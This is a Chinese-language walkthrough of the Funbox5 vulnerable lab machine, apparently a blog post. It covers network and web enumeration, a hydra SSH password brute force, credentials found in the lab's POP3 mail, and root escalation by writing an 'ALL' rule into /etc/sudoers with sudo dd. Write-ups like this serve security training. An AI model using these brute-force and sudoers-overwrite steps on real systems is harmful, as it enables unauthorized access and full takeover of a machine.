#  funbox5复现   
原创 LULU  红队蓝军   2024-11-29 10:01  
  
# 信息收集  
  
ip  
```
arp-scan -l
netdiscover -i eth0 -r 192.168.56.0/24
nmap -sP 192.168.56.0/24
masscan 192.168.56.0/24 -p 80,22

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v52JibdIqqibd8IibwUaAwmFdIkLGCUXu54HuAAibk0uspxl63hmvKszppWiacyIcJ70bTufU5Hl4YaFdA/640?wx_fmt=png&from=appmsg "")  
  
端口  
```
nmap -A -p- -T4 192.168.56.107

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v52JibdIqqibd8IibwUaAwmFdIIqxKy4KkbZNKoPHHDUHAPa3ia9mHVn0s7baGicawbP7R1THs9yRTib6Yg/640?wx_fmt=png&from=appmsg "")  
  
目录  
```
使用dirsearch

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v52JibdIqqibd8IibwUaAwmFdIxIibSWib0ZRbqczyibUBMsDyVaicV2wsVic2ZavVHeUQxuNHwVhdCdOcj8A/640?wx_fmt=png&from=appmsg "")  
  
访问robots.txt  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v52JibdIqqibd8IibwUaAwmFdI9hc94bLTg5xgFlibLVUs1WW0YYXuYVm6SnADFviazoNazb2qeeRiavwYA/640?wx_fmt=png&from=appmsg "")  
  
访问/drupal,重定向到192.168.178.33  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v52JibdIqqibd8IibwUaAwmFdI9AAwT2j2iaVXA3iaz2fU6DGm7dG901EonMHCcEtf6WEy6HY5yIF4UXdg/640?wx_fmt=png&from=appmsg "")  
  
针对于http://192.168.56.107/drupal/ 再次扫描drupal下的目录  
```
dirsearch -u http://192.168.56.107/drupal/ 

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v52JibdIqqibd8IibwUaAwmFdIibzlUtMqSMrxwWkiaarV5aEAchIk21qM1Mlml2vH6IBkN1IxvUxhCUyw/640?wx_fmt=png&from=appmsg "")  
```
dirb http://192.168.56.107/drupal

```  
  
  
网站探测  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v52JibdIqqibd8IibwUaAwmFdIzTZRFu4K0TbMBjjKRIuMX2SyjtGj7sCpxtibsw8jia1qFXIzWdbnd0iaA/640?wx_fmt=png&from=appmsg "")  
  
网站由WordPress，利用 wpscan 进行扫描对用户进行枚举，发现两个用户  
```
wpscan --url http://192.168.56.107/drupal/index.php--enumerate u

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v52JibdIqqibd8IibwUaAwmFdIiahjZlKrUIoHJR1eWAlJED3siaNEWYx6R8fsx2ic7Lk1ES7BDRf6Z3mdg/640?wx_fmt=png&from=appmsg "")  
  
根据提示--wp-content-dir制定URL  
```
wpscan --url http://192.168.56.107/drupal/index.php --wp-content-dir=http://192.168.56.107/drupal/wp-content --enumerate u

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v52JibdIqqibd8IibwUaAwmFdI2ibyRlx8ia5IMp5MzU0dykzznQll4fXLJVk6G8fiaemGOvribuXq8icHEaw/640?wx_fmt=png&from=appmsg "")  
  
爆破密码  
```
hydra -L user.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.107

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v52JibdIqqibd8IibwUaAwmFdI5Uic2MrkA7iaic5kaUvzDHJJ0uibibB6xF83IJUtPRNNicuwjhU8iaZL9WrYQ/640?wx_fmt=png&from=appmsg "")  
  
登录ssh    用户名/密码  ben/pookie  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v52JibdIqqibd8IibwUaAwmFdIJ070t2tecK3QrMKXl2MicTS81y47qXyiahhWjso6OAsTbcwGkdUsWAcw/640?wx_fmt=png&from=appmsg "")  
  
ben用户属于附属组 mail (GID 8)。这在管理用户权限和访问控制时非常有用。例如，属于 mail 组的用户通常会有权限访问与邮件服务相关的资源或文件。  
  
查看mail。提示没有权限  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v52JibdIqqibd8IibwUaAwmFdIgNMzFtku33lRw6cvEkGCTUuKdwLor5ibpWc0oAZnyUL6ric8vFLAzypQ/640?wx_fmt=png&from=appmsg "")  
  
查看后台监听端口  
```
netstat -anp

```  
  
后台监听端口发现 110端口  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v52JibdIqqibd8IibwUaAwmFdIlw4IvPicjYicPhL5iapLDGmSWwgxN6qo9PWbhI4Oib3rAss4A0xRSLAa8w/640?wx_fmt=png&from=appmsg "")  
  
端口110是POP3（邮局协议版本3）的默认端口，用于电子邮件的接收和下载。  
  
使用telnet 连接。用 ben 用户的信息凭据登录  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v52JibdIqqibd8IibwUaAwmFdIHYibZbgCZ8NnWTjRmhvgP38HL0EW52zMZQpn6qOQMzmY9rZZluIXTDw/640?wx_fmt=png&from=appmsg "")  
  
发现有三封邮件，403 、391、578  
  
查看578邮件，得到用户名 / 密码  adam: qwedsayxc!  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v52JibdIqqibd8IibwUaAwmFdIAobtmozLupmrq4oGFR4n2oYlXnH6pwRiabantOicKFibbfkEoEXEUnPrA/640?wx_fmt=png&from=appmsg "")  
  
登录用户adam,附属组为sudo  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v52JibdIqqibd8IibwUaAwmFdItPnJvMxAkFeqibEQWCW6hWNZ8EA890mv9V3r5DolmdibYx3n6yic6u7hQ/640?wx_fmt=png&from=appmsg "")  
  
sudo 提权  
```
sudo -l

```  
  
adam不需要密码就能以root的身份执行命令  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v52JibdIqqibd8IibwUaAwmFdIQvysXtD9PctF9RmU5xlFaYN63vSjd54Chr3Fa17phUQFgQQK3k9yww/640?wx_fmt=png&from=appmsg "")  
  
通过网站GTFOBins查询提权方法  
  
https://gtfobins.github.io/  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v52JibdIqqibd8IibwUaAwmFdIFOJgfCUdZt8ASDfN5O5nIK76dn5setgHJ4jEKoW4NLVA2VeQeLY87g/640?wx_fmt=png&from=appmsg "")  
  
提权方法  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v52JibdIqqibd8IibwUaAwmFdIybKzPiarXQGnmibBuyGjggPiadxyiaRZ1OYUw4GV66KM9RAia5hAx1sGczw/640?wx_fmt=png&from=appmsg "")  
  
该命令可以写入具有root权限的文件，执行命令进行写入文件/etc/sudoers，即设置adam用户具有全部的特权命令。  
  
/etc/sudorers文件解释  
  
该文件允许特定用户像root用户一样使用各种各样的命令，而不需要root用户的密码。  
  
当用户执行sudo时，系统会主动寻找/etc/sudoers文件，判断该用户是否有执行sudo的权限。  
```
LFILE=/etc/sudoers
echo "adam   ALL=(ALL:ALL) ALL " | sudo dd of=$LFILE

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v52JibdIqqibd8IibwUaAwmFdINkCFdaoQc98k2Tw5iafqGQnAK0ibXUodtyK2dzm43BJJlPWCl7QuyKHA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v52JibdIqqibd8IibwUaAwmFdIWiaCjkLlHr6Nuto0CWyTd14TFY2WdWHWH9dFMzwA7gDqYddRYlFz9aA/640?wx_fmt=png&from=appmsg "")  
  
找到flag  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v52JibdIqqibd8IibwUaAwmFdITAtbADUAMxibNLqmotWR1DibQ4I7CIfyq12AFzChd9nbdZrJ9gq2iaicZw/640?wx_fmt=png&from=appmsg "")  
  
  
  
